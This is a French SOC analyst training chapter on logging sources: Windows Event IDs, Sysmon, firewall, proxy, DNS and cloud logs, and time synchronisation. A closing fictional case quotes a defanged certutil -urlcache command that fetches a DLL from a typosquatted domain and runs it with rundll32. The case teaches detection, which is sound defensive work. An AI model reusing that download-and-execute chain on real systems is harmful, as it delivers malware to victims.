---
title: Chapitre 2 — Logging et télémétrie
source: Cyber/06 Détection & réponse/Analyste SOC.md
note: Analyste SOC
up:
- - Analyste SOC
  - ../index.md
- - Partie I — Fondations
  - index.md
---

## 2.1 Pourquoi les logs sont le carburant du SOC

Sans logs, pas de détection, pas d'investigation, pas de preuve. Chaque alerte du SIEM est construite à partir de logs. Chaque investigation pivote entre des logs de sources différentes. Chaque conclusion est étayée par des événements horodatés dans les logs. L'objectif fondamental est de répondre à trois questions : **qui** a fait **quoi**, **quand** ?

La qualité de la détection est directement proportionnelle à la qualité et à la couverture des logs. Un SOC avec un SIEM de 500 000 €/an mais des logs Windows limités au Security Log par défaut (sans Sysmon, sans commande line logging) détectera moins qu'un SOC avec un SIEM open source et une télémétrie riche. L'investissement dans le logging est le meilleur investissement en détection.

## 2.2 Sources Windows — les Event IDs essentiels

Le Security Log est la source primaire pour l'authentification et l'audit de sécurité.

**Event ID 4624 (Successful Logon) :** chaque authentification réussie, avec le type de logon. Les types critiques pour le SOC : Type 2 (Interactive — login physique), Type 3 (Network — accès à un partage, PsExec, WMI), Type 7 (Unlock — déverrouillage de session), Type 10 (RemoteInteractive — RDP). Le 4624 contient le nom du compte, le domaine, l'IP source (pour les logons réseau), et le processus d'authentification (NTLM vs Kerberos). Un 4624 Type 3 depuis un poste de travail lambda vers un serveur critique à 3h du matin est un signal de mouvement latéral. FP courant : les comptes de service qui s'authentifient massivement en Type 3 — à baseliner.

**Event ID 4625 (Failed Logon) :** chaque échec d'authentification. Une rafale de 4625 avec des comptes variés depuis une même source est un password spraying. Le sous-status code précise la raison (0xC0000064 = compte inexistant, 0xC000006A = mot de passe incorrect, 0xC0000234 = compte verrouillé). FP courant : les applications mal configurées qui tentent de s'authentifier en boucle avec des credentials expirés.

**Event ID 4648 (Logon with Explicit Credentials) :** un processus s'authentifie avec des credentials différentes de celles de la session (runas, PsExec avec -u, pass-the-hash). Signal de mouvement latéral ou d'utilisation de credentials volées.

**Event ID 4672 (Special Privileges Assigned) :** attribution de privilèges administratifs lors d'un logon. Un 4672 pour un compte utilisateur standard est suspect.

**Event ID 4688 (Process Creation) :** création de processus avec (si la GPO est activée — et elle DOIT l'être) la ligne de commande complète. C'est l'Event ID le plus riche pour la détection d'exécution suspecte. Sans l'activation du command line logging (GPO « Include command line in process creation events »), le 4688 est beaucoup moins utile — c'est la première recommandation de « forensic readiness » pour le SOC.

**Event ID 7045 (Service Installed) :** installation d'un nouveau service. PsExec crée le service PSEXESVC. Les malwares installent des services pour la persistence. Un 7045 avec un nom de service inhabituel ou un chemin d'exécutable dans un répertoire temporaire mérite investigation.

**Event ID 4769 (Kerberos Service Ticket Requested) :** avec encryption type 0x17 (RC4), c'est la signature du Kerberoasting. Un volume élevé de 4769 RC4 depuis une seule machine est un signal critique.

**Event ID 4698 (Scheduled Task Created) :** création d'une tâche planifiée — mécanisme de persistence courant.

**Event ID 1102 (Security Log Cleared) :** effacement du Security Log — l'acte de nettoyage produit ironiquement son propre événement. Signal d'anti-forensics.

## 2.3 Sysmon — le game changer de la télémétrie

Sysmon (System Monitor, Microsoft Sysinternals) est l'outil de télémétrie le plus impactant que le SOC puisse déployer. Il produit des Event IDs riches qui comblent les lacunes du Security Log natif.

**Event 1 (Process Create) :** plus détaillé que le 4688 — hash du binaire, ligne de commande complète, processus parent complet (pas juste le PID — le nom et le chemin du parent). C'est LA source pour la détection d'exécution suspecte.

**Event 3 (Network Connection) :** quel processus se connecte à quelle IP et sur quel port. Absent des logs Windows natifs — sans Sysmon Event 3, le SOC ne sait pas quel processus communique avec le C2.

**Event 7 (Image Loaded) :** DLL chargées par un processus — détection de DLL sideloading et de DLL injection.

**Event 10 (Process Access) :** accès d'un processus à un autre — détection d'accès à LSASS (credential dumping).

**Event 11 (File Create) :** fichiers créés — détection de drops de malware, de staging de données.

**Event 22 (DNS Query) :** résolutions DNS par processus — quel processus résout quel domaine. Essentiel pour la corrélation processus → réseau.

La configuration Sysmon est critique : la configuration par défaut est trop verbeuse (elle génère des millions d'événements par jour). La configuration **SwiftOnSecurity** (GitHub) est la base recommandée — elle filtre le bruit tout en conservant les événements de haute valeur. L'ajustement pour l'environnement spécifique (exclusion des applications bruyantes mais légitimes) est un travail continu du detection engineer.

## 2.4 Sources réseau

Les **logs firewall** (Palo Alto, Fortinet, Check Point) montrent les flux autorisés et refusés avec IP source, IP destination, port, protocole, et volume. Ils répondent à la question « qui parle à qui ». Utilité SOC : identifier les communications inhabituelles (destinations rares, ports non standard, volumes anormaux), détecter les scans, et quantifier les flux sortants (exfiltration).

Les **logs proxy** (Zscaler, Squid, Blue Coat) montrent le contenu applicatif : URL complète, user-agent, catégorie du site, méthode HTTP (GET/POST), et volume de données. Ils voient au-delà du firewall — le firewall voit « connexion HTTPS vers 1.2.3.4:443 », le proxy voit « POST vers hxxps://mega.nz/upload avec 2 Go de données ». Utilité SOC : identifier le C2 web, l'exfiltration vers des services de partage, et les téléchargements suspects.

Les **logs DNS** (Infoblox, Windows DNS, BIND, Pi-hole, résolveurs cloud) montrent les résolutions de domaine. Utilité SOC : identifier les domaines DGA (Domain Generation Algorithm — domaines aléatoires caractéristiques des botnets), le DNS tunneling (données encodées dans les sous-domaines), et les résolutions vers des C2 connus.

Les **logs VPN** (Fortinet, Cisco, Palo Alto GlobalProtect, Ivanti/Pulse Secure) montrent les connexions avec IP source, géolocalisation, horodatage, et durée. Utilité SOC : détecter l'impossible travel (connexion depuis Paris et Hong Kong à 1h d'intervalle), les connexions depuis des géographies inhabituelles, et l'utilisation de credentials compromises.

Les **NetFlow** (métadonnées de flux sans le contenu — source, destination, port, volume, durée) sont disponibles sur les routeurs et les switches. Utilité SOC : analyse de volume à grande échelle, détection de beaconing, et cartographie des communications internes inhabituelles.

## 2.5 Sources cloud et SaaS

En 2025-2026, les sources cloud sont devenues aussi critiques que les sources endpoint.

**Azure AD / Entra ID Sign-in Logs :** chaque authentification vers les services Microsoft (M365, Azure, applications SAML/OIDC) avec IP source, géolocalisation, device info, résultat de la conditional access policy, méthode MFA utilisée, et risk level. C'est la source primaire pour la détection des compromissions d'identité cloud.

**Microsoft 365 Unified Audit Log (UAL) :** chaque action dans M365 — emails envoyés/reçus, fichiers accédés/partagés dans SharePoint/OneDrive, règles Outlook créées/modifiées, applications ajoutées, et permissions changées. C'est la source primaire pour la détection des BEC (Business Email Compromise) et des exfiltrations cloud.

**AWS CloudTrail :** chaque appel API AWS — création d'instances, modification de security groups, accès aux buckets S3, modifications IAM. Chaque action dans AWS passe par une API et CloudTrail l'enregistre.

## 2.6 Synchronisation horaire et fuseaux

Toutes les sources de logs doivent être synchronisées via NTP (Network Time Protocol) et tous les timestamps doivent être convertis en **UTC** avant corrélation. Sans synchronisation, la timeline multi-sources est fausse — un événement firewall en UTC et un événement proxy en heure locale Paris (UTC+1 ou UTC+2 selon la saison) créent un décalage de 1-2 heures qui rend la corrélation impossible. C'est le piège n°1 de l'investigation SOC.

## 2.7 Fil rouge — FALCONWATCH : ce que les logs montrent

> **🛡️ FALCONWATCH — Épisode 2**
>
> L'alerte EDR fournit le process tree : `WINWORD.EXE (PID 8412) → cmd.exe (PID 9201) → certutil.exe (PID 9215, args: -urlcache -split -f hxxps://update-norexia[.]xyz/lib.dll C:\Users\Public\lib.dll) → rundll32.exe (PID 9284, args: C:\Users\Public\lib.dll,DllMain)`. Karim note immédiatement : certutil avec -urlcache est un LOLBin classique (T1105 Ingress Tool Transfer), et le domaine `update-norexia[.]xyz` est un typosquatting du domaine légitime de Norexia. Le parent winword.exe confirme un document Office piégé.
>
> Karim vérifie les logs Sysmon (collectés dans le SIEM Splunk) : Event 1 confirme la chaîne de processus avec les hash de chaque binaire. Event 3 montre que rundll32.exe (PID 9284) établit une connexion HTTPS vers `185.xx.xx.xx:443` — le C2. Event 22 montre la résolution DNS de `update-norexia[.]xyz` vers `185.xx.xx.xx` par le processus certutil. Les logs proxy confirment le download de lib.dll (2.4 Mo, HTTPS, certificat Let's Encrypt émis 48h plus tôt).

---
